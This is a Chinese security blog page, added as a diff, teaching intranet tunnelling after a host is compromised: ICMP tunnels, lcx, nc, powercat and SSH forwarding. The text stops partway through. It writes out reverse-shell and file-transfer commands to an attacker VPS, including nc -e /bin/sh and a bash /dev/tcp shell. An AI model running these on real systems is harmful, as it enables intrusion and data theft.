@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="@[TOC] 0x00 内网穿透技术当我们拿到一台内网主机后，一般都是有区域隔离的。 所以内网隧道技术，就是我们必须要掌握的。 我简单介绍一下建立通信隧道，常见的有端口转发等 主要隧道有： ICMP TCP UDP SSH HTTP DNS SOCKS 0x01 首先判断出网协议icmp协议： 12ping 命令ping www.baidu.com  TCP协议： 12curl www.ba">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网安全学习从入门到入狱-知识-内网隧道技术小结">
+<meta property="og:url" content="https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/index.html">
+<meta property="og:site_name" content="Zeo 安全实验室">
+<meta property="og:description" content="@[TOC] 0x00 内网穿透技术当我们拿到一台内网主机后，一般都是有区域隔离的。 所以内网隧道技术，就是我们必须要掌握的。 我简单介绍一下建立通信隧道，常见的有端口转发等 主要隧道有： ICMP TCP UDP SSH HTTP DNS SOCKS 0x01 首先判断出网协议icmp协议： 12ping 命令ping www.baidu.com  TCP协议： 12curl www.ba">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/202005061043407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200506104408292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200506104440491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200506104524136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200506104547485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200506104606195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200506104619902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200506104758900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2020-05-06T02:49:39.000Z">
+<meta property="article:modified_time" content="2020-05-08T07:43:29.444Z">
+<meta property="article:author" content="Zeo">
+<meta property="article:tag" content="内网安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/202005061043407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>内网安全学习从入门到入狱-知识-内网隧道技术小结</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories">分类</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/05/08/hello-world/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/04/26/google%20hack%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%B8%B8%E7%94%A8%E6%80%BB%E7%BB%93/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/&text=内网安全学习从入门到入狱-知识-内网隧道技术小结" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/&title=内网安全学习从入门到入狱-知识-内网隧道技术小结" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/&is_video=false&description=内网安全学习从入门到入狱-知识-内网隧道技术小结" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网安全学习从入门到入狱-知识-内网隧道技术小结&body=Check out this article: https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/&title=内网安全学习从入门到入狱-知识-内网隧道技术小结" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/&title=内网安全学习从入门到入狱-知识-内网隧道技术小结" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/&title=内网安全学习从入门到入狱-知识-内网隧道技术小结" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/&title=内网安全学习从入门到入狱-知识-内网隧道技术小结" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/&name=内网安全学习从入门到入狱-知识-内网隧道技术小结&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://godzeo.github.io/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/&t=内网安全学习从入门到入狱-知识-内网隧道技术小结" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-内网穿透技术"><span class="toc-number">1.</span> <span class="toc-text">0x00 内网穿透技术</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-首先判断出网协议"><span class="toc-number">2.</span> <span class="toc-text">0x01 首先判断出网协议</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-各种协议隧道"><span class="toc-number">3.</span> <span class="toc-text">0x02 各种协议隧道</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#网络层"><span class="toc-number">4.</span> <span class="toc-text">网络层</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ICMP隧道"><span class="toc-number">4.1.</span> <span class="toc-text">ICMP隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lcx"><span class="toc-number">4.2.</span> <span class="toc-text">Lcx</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#传输层"><span class="toc-number">5.</span> <span class="toc-text">传输层</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#瑞士军刀：nc"><span class="toc-number">5.1.</span> <span class="toc-text">瑞士军刀：nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Powercat（powershell版的nc）"><span class="toc-number">5.2.</span> <span class="toc-text">Powercat（powershell版的nc）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#应用层"><span class="toc-number">6.</span> <span class="toc-text">应用层</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH转发："><span class="toc-number">6.1.</span> <span class="toc-text">SSH转发：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-本地转发机制："><span class="toc-number">6.2.</span> <span class="toc-text">SSH 本地转发机制：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-远程转发机制："><span class="toc-number">6.3.</span> <span class="toc-text">SSH 远程转发机制：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-动态转发机制："><span class="toc-number">6.4.</span> <span class="toc-text">SSH 动态转发机制：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-HTTPS协议隧道"><span class="toc-number">6.5.</span> <span class="toc-text">HTTP HTTPS协议隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS-隧道："><span class="toc-number">6.6.</span> <span class="toc-text">DNS 隧道：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Socks代理："><span class="toc-number">6.7.</span> <span class="toc-text">Socks代理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#推荐使用"><span class="toc-number">6.8.</span> <span class="toc-text">推荐使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nps"><span class="toc-number">6.9.</span> <span class="toc-text">Nps</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ew"><span class="toc-number">6.10.</span> <span class="toc-text">ew</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Frp"><span class="toc-number">6.11.</span> <span class="toc-text">Frp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-总结"><span class="toc-number">7.</span> <span class="toc-text">0x03 总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        内网安全学习从入门到入狱-知识-内网隧道技术小结
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Zeo 安全实验室</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-05-06T02:49:39.000Z" itemprop="datePublished">2020-05-06</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">内网安全研究</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" rel="tag">内网安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <a id="more"></a>
+
+
+<p>@[TOC]</p>
+<h1 id="0x00-内网穿透技术"><a href="#0x00-内网穿透技术" class="headerlink" title="0x00 内网穿透技术"></a>0x00 内网穿透技术</h1><p>当我们拿到一台内网主机后，一般都是有区域隔离的。</p>
+<p>所以内网隧道技术，就是我们必须要掌握的。</p>
+<p>我简单介绍一下建立通信隧道，常见的有端口转发等</p>
+<p>主要隧道有：</p>
+<p>ICMP TCP UDP</p>
+<p>SSH HTTP DNS</p>
+<p>SOCKS</p>
+<h1 id="0x01-首先判断出网协议"><a href="#0x01-首先判断出网协议" class="headerlink" title="0x01 首先判断出网协议"></a>0x01 首先判断出网协议</h1><p>icmp协议：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping 命令</span><br><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>TCP协议：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl www.baidu.com</span><br><span class="line">nc IP</span><br></pre></td></tr></table></figure>
+
+<p>HTTP协议：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl ip:port</span><br><span class="line">curl www.baidu.com:80</span><br></pre></td></tr></table></figure>
+
+<p>DNS协议：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Nslookup www.baidu.com</span><br><span class="line">Dig www.baidu.com</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="0x02-各种协议隧道"><a href="#0x02-各种协议隧道" class="headerlink" title="0x02 各种协议隧道"></a>0x02 各种协议隧道</h1><h1 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h1><h2 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h2><p>ICMP（Internet Control Message Protocol）：没有目的端口与源端口，属于Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。</p>
+<p>icmp隧道常用攻击：icmpsh、PRISM</p>
+<p>icmpsh<br>环境说明:跨平台、不需要管理员运行</p>
+<p>有三台机器： VPS–边界机–内网机</p>
+<p>VPS操作过程：</p>
+<p>下载icmpsh</p>
+<p>安装依赖</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">服务端禁用：</span><br><span class="line">icmp respones  sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1</span><br><span class="line"></span><br><span class="line">运行程序 ：</span><br><span class="line">.&#x2F;run.sh</span><br><span class="line"></span><br><span class="line">输入目标主机IP地址 开启监听：</span><br><span class="line">.&#x2F;icmpsh_m,py  vpsip 边界出网的公网IP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在边界机执行：</span><br><span class="line">Imp.exe -t 攻击机ip -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure>
+
+
+
+<p>还有一种方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">编译 gcc icmpsh-m.c</span><br><span class="line"></span><br><span class="line">VPS开启监听： sudo .&#x2F;a.out</span><br><span class="line"></span><br><span class="line">内网边界主机：icmpsh.exe -t VPSip -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Lcx"><a href="#Lcx" class="headerlink" title="Lcx"></a>Lcx</h2><p>内网端口转发 </p>
+<p>老工具了也是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">目标主机：</span><br><span class="line"></span><br><span class="line">lcx.exe -slave vpsip 4444 127.0.0.1 3389</span><br><span class="line"></span><br><span class="line">VPS:</span><br><span class="line"></span><br><span class="line">Lcx --listen 4444 5555</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h1><h2 id="瑞士军刀：nc"><a href="#瑞士军刀：nc" class="headerlink" title="瑞士军刀：nc"></a>瑞士军刀：nc</h2><p>nc 是一款比较老的工具，但是确实是经典俗称瑞士军刀，简单介绍一下</p>
+<p>简单互相传输功能：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vps：</span><br><span class="line"></span><br><span class="line">nc -lp 5555 </span><br><span class="line"></span><br><span class="line">目标机器：</span><br><span class="line"></span><br><span class="line">Nc -vn vpsip 5555</span><br></pre></td></tr></table></figure>
+
+<p>文件传输功能：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vps：</span><br><span class="line"></span><br><span class="line">nc -lp 5555 &gt;1.txt</span><br><span class="line"></span><br><span class="line">目标机器：</span><br><span class="line"></span><br><span class="line">Nc -vn vpsip &lt; xx.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<p>shell的反弹：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">正向连接：</span><br><span class="line"></span><br><span class="line">nc -lvp 4444 -e &#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">nc  192.168.1.1 4444</span><br><span class="line"></span><br><span class="line">反向连接：</span><br><span class="line"></span><br><span class="line">nc -lvp 4444</span><br><span class="line"></span><br><span class="line">nc 192.168.1.1 4444 -e &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
+
+<p>注意：windows版本CMD位置</p>
+<p>C:\windows\system32\cmd.exe</p>
+<p>Bash反向shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br><span class="line"></span><br><span class="line">Bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.1&#x2F;4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="Powercat（powershell版的nc）"><a href="#Powercat（powershell版的nc）" class="headerlink" title="Powercat（powershell版的nc）"></a>Powercat（powershell版的nc）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">正向和反向连接：</span><br><span class="line"></span><br><span class="line">powercat -l -p 8080 -e cmd.exe  -v   </span><br><span class="line">nc 192.168.1.1 8080 -vv</span><br><span class="line"></span><br><span class="line">nc -l -p 8080 -vv</span><br><span class="line">powercat -c 192.169.1.1 -p 8080 -e cmd.exe -v</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以反弹powershell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-eq</span><br></pre></td></tr></table></figure>
+
+<p><strong>文件上传</strong></p>
+<p>这个不用说，基本这种连接的都支持</p>
+<p>在<code>c:</code>下新建一个<code>test.txt</code>的文件，写入数据</p>
+<p>在有<code>text.txt</code>的机器执行:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 192.168.12.108 -p 9999 -i c:test.txt -v</span><br></pre></td></tr></table></figure>
+
+<p>另一台机器执行</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 9999 -of c:test.txt -v</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><h2 id="SSH转发："><a href="#SSH转发：" class="headerlink" title="SSH转发："></a>SSH转发：</h2><p>一个正常的SSH命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.1.1</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="SSH-本地转发机制："><a href="#SSH-本地转发机制：" class="headerlink" title="SSH 本地转发机制："></a>SSH 本地转发机制：</h2><p>拓扑：</p>
+<p>VPS—-边界WEB—-目标主机</p>
+<p>边界WEB双网卡192.168.1.1和10.1.1.1段</p>
+<p>本地转发机制：</p>
+<p>选项：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-C 压缩传输</span><br><span class="line">-f 后台启用</span><br><span class="line">-N 不打开远程shell，处于等待状态</span><br><span class="line">-g 允许本地转发端口</span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用方法：</p>
+<p><strong>在VPS上运行</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L &lt;vps port&gt;:&lt;目标主机 host&gt;:&lt;目标主机 port&gt; &lt;SSH 边界机&gt;</span><br><span class="line"></span><br><span class="line">ssh  -CfNg -l 5555:10.1.1.1:3389 root@192.168.1.1</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#VPS检查---查看端口是否已经连接</span><br><span class="line">netstat -tulnp | grep &quot;5555&quot;</span><br></pre></td></tr></table></figure>
+
+<p>当访问 VPS 5555 端口的时候，就转发给 <a href="mailto:root@192.168.1.1">root@192.168.1.1</a> 边界机 ，发送给目标主机</p>
+<h2 id="SSH-远程转发机制："><a href="#SSH-远程转发机制：" class="headerlink" title="SSH 远程转发机制："></a>SSH 远程转发机制：</h2><p>拓扑：</p>
+<p>VPS—-边界WEB—-目标主机</p>
+<p>边界WEB—-目标主机—都是单网卡，都是纯内网 10.1.1.1段</p>
+<p><strong>在WEB边界机运行</strong></p>
